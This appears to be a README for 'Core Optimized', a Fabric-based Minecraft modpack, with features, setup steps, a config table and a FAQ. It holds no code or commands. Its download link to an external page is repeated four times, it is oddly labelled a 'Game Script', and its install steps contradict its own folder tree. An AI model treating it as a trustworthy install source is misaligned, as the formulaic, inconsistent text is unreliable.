# Core Optimized - Performance Modpack for Minecraft

> **A Fabric-based Minecraft modpack that stays close to vanilla while focusing on performance tuning and practical quality-of-life upgrades, without changing the core gameplay loop.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonio2006/core-optimized-qol-pack?style=flat-square)](https://github.com/brandonio2006/core-optimized-qol-pack)

---

<p align="center">
  <a href="https://brandonio2006.github.io/core-optimized-qol-pack/">
    <img src="https://img.shields.io/badge/Download-Core%20Optimized%20Modpack-brightgreen?style=for-the-badge" alt="Download Core Optimized Modpack">
  </a>
</p>

> **[Download Core Optimized](https://brandonio2006.github.io/core-optimized-qol-pack/)**

---

[Download Latest Build](https://brandonio2006.github.io/core-optimized-qol-pack/)

---

## What This Pack Is

Core Optimized is a hand-picked modpack made to improve Minecraft without losing the feel of the base game. It runs on the Fabric mod loader and is centered around better frame rates, less stutter, and faster chunk loading by using well-known optimization mods. Each included piece was chosen to preserve vanilla balance and presentation, so it suits players who want a smoother experience without the weight of large content-focused packs.

Alongside performance work, the pack adds a set of understated quality-of-life features that make everyday play less cumbersome, including help for inventory handling and moving around the world. Resource packs are bundled to match vanilla visuals while also reducing rendering overhead. Ongoing updates help keep the pack aligned with current Minecraft and mod releases so it remains stable and current.

---

## Script Features

- **Performance Optimization** - Improved frame pacing and lower lag through optimized rendering, memory handling, and chunk loading routines
- **Vanilla-Like Experience** - Keeps the original mechanics, progression, and visual identity intact, with no added blocks, items, or dimensions
- **Quality-of-Life Improvements** - Small usability upgrades for inventory sorting, tooltips, minimaps, and keybind customization
- **Stability Enhancements** - Includes crash fixes, memory leak prevention, and more dependable world loading
- **Resource Pack Integration** - Lightweight texture and model updates that cut GPU load while keeping the vanilla look
- **Fabric Mod Loader** - Fast, lightweight modding framework with wide compatibility across recent Minecraft versions
- **Contribution Friendly** - Open source and open to community input through Hacktoberfest and regular pull requests

---

## Setup

1. Download the latest modpack archive from the link above.
2. Install the Fabric mod loader for your Minecraft version.
3. Extract the modpack contents into your Minecraft `mods` folder.
4. Launch Minecraft using the Fabric profile.

Example folder structure:
```
.minecraft/
├── mods/
│   ├── coreoptimized-performance.jar
│   ├── coreoptimized-qol.jar
│   └── coreoptimized-resources.zip
└── resourcepacks/
    └── coreoptimized-textures.zip
```

---

## Options

| Setting | Default | Description |
|---------|---------|-------------|
| `enable_dynamic_lighting` | `true` | Toggle dynamic lighting effects from held items |
| `render_distance_boost` | `12` | Custom chunk render distance (4-32) |
| `smooth_fps_limit` | `144` | Frame rate cap (30-360) |
| `show_minimap` | `true` | Enable/disable minimap overlay |
| `auto_sort_inventory` | `false` | Automatically sort inventory on open |

Configuration can be adjusted in the `config/coreoptimized.toml` file.

---

## Compatibility

This modpack is intended for **Minecraft Java Edition** 1.20 and newer, using the **Fabric** mod loader. It does not work with Forge-based modpacks or OptiFine. Certain mods can clash with heavy content packs or world-editing tools. Actual performance improvements depend on your hardware and current system setup.

---

## FAQ

**How do I install the modpack?**  
Use the setup steps above and make sure the Fabric version matches your Minecraft version.

**Will the modpack update automatically?**  
No. New releases must be downloaded manually, so check the repository for update notices.

**Can I add or remove mods?**  
Yes. The pack is modular, so you can remove mods you do not want, though performance may change.

**Is this compatible with multiplayer servers?**  
It is a client-side modpack. Most optimization mods can still work on servers, but some QoL features may need server-side mods.

**Where are my configuration files stored?**  
All settings are stored in the `config/` folder inside your Minecraft directory.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
